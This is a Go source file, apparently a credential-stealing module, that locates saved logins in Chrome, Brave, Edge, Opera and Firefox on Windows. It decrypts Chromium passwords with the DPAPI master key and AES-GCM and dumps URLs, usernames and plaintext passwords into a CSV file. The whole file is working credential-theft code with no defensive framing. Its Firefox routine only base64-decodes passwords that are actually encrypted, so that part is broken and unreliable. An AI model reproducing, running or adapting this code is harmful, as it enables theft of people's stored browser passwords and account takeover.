package passwords

import (
	"crypto/aes"
	"crypto/cipher"
	"database/sql"
	"encoding/base64"
	"encoding/csv"
	"encoding/json"
	"fmt"
	"io"
	"os"
	"os/user"
	"path/filepath"
	"syscall"
	"unsafe"

	_ "github.com/mattn/go-sqlite3"
)

// Windows DPAPI constants and structures
const (
	CRYPTPROTECT_UI_FORBIDDEN = 0x1
)

var (
	dllcrypt32  = syscall.NewLazyDLL("Crypt32.dll")
	dllkernel32 = syscall.NewLazyDLL("Kernel32.dll")

	procDecryptData = dllcrypt32.NewProc("CryptUnprotectData")
	procLocalFree   = dllkernel32.NewProc("LocalFree")
)

type DATA_BLOB struct {
	cbData uint32
	pbData *byte
}

// BrowserPaths stores paths to browser data directories
var BrowserPaths = map[string]string{}
var OperaInstallations = []string{}

// Initialize browser paths
func init() {
	usr, err := user.Current()
	if err != nil {
		fmt.Fprintf(os.Stderr, "Error getting current user: %v\n", err)
		return
	}

	userprofile := usr.HomeDir

	BrowserPaths = map[string]string{
		"chrome":   filepath.Join(userprofile, "AppData", "Local", "Google", "Chrome", "User Data"),
		"brave":    filepath.Join(userprofile, "AppData", "Local", "BraveSoftware", "Brave-Browser", "User Data"),
		"edge":     filepath.Join(userprofile, "AppData", "Local", "Microsoft", "Edge", "User Data"),
		"opera":    filepath.Join(userprofile, "AppData", "Roaming", "Opera Software", "Opera Stable"),
		"opera_gx": filepath.Join(userprofile, "AppData", "Roaming", "Opera Software", "Opera GX Stable"),
		"firefox":  filepath.Join(userprofile, "AppData", "Roaming", "Mozilla", "Firefox", "Profiles"),
		"tor":      filepath.Join(userprofile, "AppData", "Roaming", "Tor Browser", "Browser", "TorBrowser", "Data", "Browser", "profile.default"),
	}

	// Add Opera installations
	OperaInstallations = []string{
		filepath.Join(userprofile, "AppData", "Roaming", "Opera Software", "Opera Stable"),
		filepath.Join(userprofile, "AppData", "Roaming", "Opera Software", "Opera GX Stable"),
	}
}

// GetSecretKey retrieves the encryption key for Chromium-based browsers

func GetSecretKey(browser string) ([]byte, error) {
	var path string

	// Special handling for Opera
	if browser == "opera" || browser == "opera_gx" {
		// For Opera, we need to check if we should use Local State from Local AppData
		localAppData := os.Getenv("LOCALAPPDATA")
		if browser == "opera" {
			path = filepath.Join(localAppData, "Opera Software", "Opera Stable", "Local State")
		} else {
			path = filepath.Join(localAppData, "Opera Software", "Opera GX Stable", "Local State")
		}

		// If not found, try Roaming AppData
		if _, err := os.Stat(path); os.IsNotExist(err) {
			roamingAppData := os.Getenv("APPDATA")
			if browser == "opera" {
				path = filepath.Join(roamingAppData, "Opera Software", "Opera Stable", "Local State")
			} else {
				path = filepath.Join(roamingAppData, "Opera Software", "Opera GX Stable", "Local State")
			}
		}
	} else {
		// Standard path for other browsers
		path = filepath.Join(BrowserPaths[browser], "Local State")
	}

	if _, err := os.Stat(path); os.IsNotExist(err) {
		return nil, fmt.Errorf("local state file for %s does not exist at %s", browser, path)
	}

	data, err := os.ReadFile(path)
	if err != nil {
		return nil, fmt.Errorf("error reading local state file: %v", err)
	}

	var localState map[string]interface{}
	if err := json.Unmarshal(data, &localState); err != nil {
		return nil, fmt.Errorf("error parsing local state JSON: %v", err)
	}

	osCrypt, ok := localState["os_crypt"].(map[string]interface{})
	if !ok {
		return nil, fmt.Errorf("os_crypt key not found in local state")
	}

	encryptedKey, ok := osCrypt["encrypted_key"].(string)
	if !ok {
		return nil, fmt.Errorf("encrypted_key not found in os_crypt")
	}

	decodedKey, err := base64.StdEncoding.DecodeString(encryptedKey)
	if err != nil {
		return nil, fmt.Errorf("error decoding base64 key: %v", err)
	}

	// Remove "DPAPI" prefix
	if len(decodedKey) > 5 {
		decodedKey = decodedKey[5:]
	} else {
		return nil, fmt.Errorf("decoded key too short")
	}

	return DecryptDPAPI(decodedKey)
}

// DecryptDPAPI decrypts data using Windows DPAPI

func DecryptDPAPI(data []byte) ([]byte, error) {
	var outBlob DATA_BLOB
	var inBlob DATA_BLOB

	inBlob.cbData = uint32(len(data))
	inBlob.pbData = &data[0]

	ret, _, err := procDecryptData.Call(
		uintptr(unsafe.Pointer(&inBlob)),
		0,
		0,
		0,
		0,
		uintptr(CRYPTPROTECT_UI_FORBIDDEN),
		uintptr(unsafe.Pointer(&outBlob)),
	)

	if ret == 0 {
		return nil, fmt.Errorf("CryptUnprotectData failed: %v", err)
	}

	defer procLocalFree.Call(uintptr(unsafe.Pointer(outBlob.pbData)))

	return unsafe.Slice(outBlob.pbData, outBlob.cbData), nil
}

// DecryptPassword decrypts a password using AES-GCM

func DecryptPassword(encryptedPassword []byte, key []byte) (string, error) {
	// Try multiple decryption methods

	// First check if data is directly encrypted with DPAPI (no prefix)
	if len(encryptedPassword) > 0 && encryptedPassword[0] != 'v' {
		decrypted, err := DecryptDPAPI(encryptedPassword)
		if err == nil {
			return string(decrypted), nil
		}
	}

	// Check for AES encryption with prefix
	if len(encryptedPassword) < 3 {
		return "", fmt.Errorf("encrypted password too short")
	}

	prefix := string(encryptedPassword[:3])

	// Method 1: Standard AES-GCM decryption for v10/v20
	if prefix == "v10" || prefix == "v20" {
		// Remove the prefix
		encryptedData := encryptedPassword[3:]

		if len(encryptedData) < 12 {
			return "", fmt.Errorf("encrypted data too short after removing prefix")
		}

		// Extract nonce and ciphertext
		nonce := encryptedData[:12]
		ciphertext := encryptedData[12:]

		block, err := aes.NewCipher(key)
		if err != nil {
			return "", fmt.Errorf("error creating cipher: %v", err)
		}

		aesGCM, err := cipher.NewGCM(block)
		if err != nil {
			return "", fmt.Errorf("error creating GCM: %v", err)
		}

		plaintext, err := aesGCM.Open(nil, nonce, ciphertext, nil)
		if err == nil {
			return string(plaintext), nil
		}
	}

	// Method 2: Alternative handling for v10 format
	if prefix == "v10" {
		encryptedData := encryptedPassword[3:]
		if len(encryptedData) >= 16 {
			nonce := encryptedData[:12]

			// Try different ways to extract ciphertext and tag
			// Some browsers might handle this differently

			// Option 1: Ciphertext is all data after nonce
			if len(encryptedData) > 12 {
				block, err := aes.NewCipher(key)
				if err == nil {
					aesGCM, err := cipher.NewGCM(block)
					if err == nil {
						plaintext, err := aesGCM.Open(nil, nonce, encryptedData[12:], nil)
						if err == nil {
							return string(plaintext), nil
						}
					}
				}
			}

			// Option 2: Ciphertext excludes the last 16 bytes (tag)
			if len(encryptedData) > 28 { // 12 (nonce) + 16 (tag) + at least some ciphertext
				block, err := aes.NewCipher(key)
				if err == nil {
					aesGCM, err := cipher.NewGCM(block)
					if err == nil {
						ciphertext := encryptedData[12 : len(encryptedData)-16]
						tag := encryptedData[len(encryptedData)-16:]
						plaintext, err := aesGCM.Open(nil, nonce, append(ciphertext, tag...), nil)
						if err == nil {
							return string(plaintext), nil
						}
					}
				}
			}
		}
	}

	// Last resort: Try DPAPI again but with the whole data
	decrypted, err := DecryptDPAPI(encryptedPassword)
	if err == nil {
		return string(decrypted), nil
	}

	return "", fmt.Errorf("all decryption methods failed")
}

// GetLoginDataPath returns the path to the Login Data file
func GetLoginDataPath(browser string) (string, error) {
	if browser == "opera" || browser == "opera_gx" {
		var basePath string
		if browser == "opera" {
			basePath = filepath.Join(os.Getenv("APPDATA"), "Opera Software", "Opera Stable")
		} else {
			basePath = filepath.Join(os.Getenv("APPDATA"), "Opera Software", "Opera GX Stable")
		}

		// Check for different possible paths for Opera
		paths := []string{
			filepath.Join(basePath, "Login Data"),
			filepath.Join(basePath, "Default", "Login Data"),
		}

		for _, path := range paths {
			if _, err := os.Stat(path); err == nil {
				return path, nil
			}
		}

		return "", fmt.Errorf("login data for %s not found", browser)
	}

	// Standard path for other browsers
	dbPath := filepath.Join(BrowserPaths[browser], "Default", "Login Data")
	if _, err := os.Stat(dbPath); os.IsNotExist(err) {
		// Try other profiles
		profiles := []string{"Profile 1", "Profile 2", "Profile 3"}
		for _, profile := range profiles {
			altPath := filepath.Join(BrowserPaths[browser], profile, "Login Data")
			if _, err := os.Stat(altPath); err == nil {
				return altPath, nil
			}
		}

		return "", fmt.Errorf("login data for %s does not exist", browser)
	}

	return dbPath, nil
}

// GetBrowserPasswords retrieves passwords from a browser's login database
func GetBrowserPasswords(browser string, secretKey []byte) ([][]string, error) {
	var results [][]string

	// Get login data path
	dbPath, err := GetLoginDataPath(browser)
	if err != nil {
		return results, err
	}

	// Copy the database file since it might be locked by the browser
	tempDB := "Loginvault.db"
	if err := copyFile(dbPath, tempDB); err != nil {
		return results, fmt.Errorf("error copying database: %v", err)
	}
	defer os.Remove(tempDB)

	db, err := sql.Open("sqlite3", tempDB)
	if err != nil {
		return results, fmt.Errorf("error opening database: %v", err)
	}
	defer db.Close()

	rows, err := db.Query("SELECT action_url, username_value, password_value FROM logins")
	if err != nil {
		return results, fmt.Errorf("error querying database: %v", err)
	}
	defer rows.Close()

	for rows.Next() {
		var url, username string
		var passwordBlob []byte

		if err := rows.Scan(&url, &username, &passwordBlob); err != nil {
			continue
		}

		if len(url) == 0 || len(username) == 0 || len(passwordBlob) == 0 {
			continue
		}

		password, err := DecryptPassword(passwordBlob, secretKey)
		if err != nil {
			// If decryption fails, just store an error message
			password = "[Failed to decrypt]"
		}

		results = append(results, []string{url, username, password})
	}

	return results, nil
}

// GetFirefoxPasswords retrieves passwords from Firefox profiles
func GetFirefoxPasswords() ([][]string, error) {
	var results [][]string

	firefoxPath := BrowserPaths["firefox"]
	if _, err := os.Stat(firefoxPath); os.IsNotExist(err) {
		return results, fmt.Errorf("Firefox profile directory does not exist")
	}

	profiles, err := os.ReadDir(firefoxPath)
	if err != nil {
		return results, fmt.Errorf("error reading Firefox profiles: %v", err)
	}

	for _, profile := range profiles {
		if !profile.IsDir() {
			continue
		}

		profilePath := filepath.Join(firefoxPath, profile.Name())
		loginsFile := filepath.Join(profilePath, "logins.json")

		if _, err := os.Stat(loginsFile); os.IsNotExist(err) {
			continue
		}

		data, err := os.ReadFile(loginsFile)
		if err != nil {
			fmt.Printf("Error reading Firefox logins file %s: %v\n", loginsFile, err)
			continue
		}

		var loginsJSON struct {
			Logins []struct {
				Hostname string `json:"hostname"`
				Username string `json:"username"`
				Password string `json:"password"`
			} `json:"logins"`
		}

		if err := json.Unmarshal(data, &loginsJSON); err != nil {
			fmt.Printf("Error parsing Firefox logins JSON: %v\n", err)
			continue
		}

		for _, login := range loginsJSON.Logins {
			password, err := base64.StdEncoding.DecodeString(login.Password)
			if err != nil {
				fmt.Printf("Error decoding Firefox password: %v\n", err)
				continue
			}

			results = append(results, []string{login.Hostname, login.Username, string(password)})
		}
	}

	return results, nil
}

// copyFile copies a file from src to dst
func copyFile(src, dst string) error {
	sourceFile, err := os.Open(src)
	if err != nil {
		return err
	}
	defer sourceFile.Close()

	destFile, err := os.Create(dst)
	if err != nil {
		return err
	}
	defer destFile.Close()

	_, err = io.Copy(destFile, sourceFile)
	return err
}

// ExtractPasswords extracts passwords from all supported browsers

func ExtractPasswords() error {
	// Create passwords directory
	if err := os.MkdirAll("Results", 0755); err != nil {
		return fmt.Errorf("error creating passwords directory: %v", err)
	}

	// Create CSV file
	file, err := os.Create(filepath.Join("Results", "decrypted_password.csv"))
	if err != nil {
		return fmt.Errorf("error creating CSV file: %v", err)
	}
	defer file.Close()

	writer := csv.NewWriter(file)
	defer writer.Flush()

	// Write header
	if err := writer.Write([]string{"index", "browser", "url", "username", "password", "user"}); err != nil {
		return fmt.Errorf("error writing CSV header: %v", err)
	}

	currentUser, err := user.Current()
	if err != nil {
		return fmt.Errorf("error getting current user: %v", err)
	}

	index := 0

	// Extract from Chromium-based browsers
	for _, browser := range []string{"chrome", "brave", "edge", "opera", "opera_gx"} {
		fmt.Printf("[*] Attempting to extract %s passwords...\n", browser)

		secretKey, err := GetSecretKey(browser)
		if err != nil {
			fmt.Printf("[-] Error getting secret key for %s: %v\n", browser, err)
			continue
		}

		passwords, err := GetBrowserPasswords(browser, secretKey)
		if err != nil {
			fmt.Printf("[-] Error getting passwords for %s: %v\n", browser, err)
			continue
		}

		for _, password := range passwords {
			record := []string{
				fmt.Sprintf("%d", index),
				browser,
				password[0], // URL
				password[1], // Username
				password[2], // Password
				currentUser.Username,
			}

			if err := writer.Write(record); err != nil {
				return fmt.Errorf("error writing password record: %v", err)
			}

			index++
		}

		fmt.Printf("[+] Extracted %d %s passwords.\n", len(passwords), browser)
	}

	// Extract from Firefox
	fmt.Println("[*] Attempting to extract Firefox passwords...")
	firefoxPasswords, err := GetFirefoxPasswords()
	if err != nil {
		fmt.Printf("[-] Error getting Firefox passwords: %v\n", err)
	} else {
		for _, password := range firefoxPasswords {
			record := []string{
				fmt.Sprintf("%d", index),
				"firefox",
				password[0], // URL
				password[1], // Username
				password[2], // Password
				currentUser.Username,
			}

			if err := writer.Write(record); err != nil {
				fmt.Printf("[-] Error writing Firefox password record: %v\n", err)
				continue
			}

			index++
		}

		fmt.Printf("[+] Extracted %d Firefox passwords.\n", len(firefoxPasswords))
	}

	return nil
}
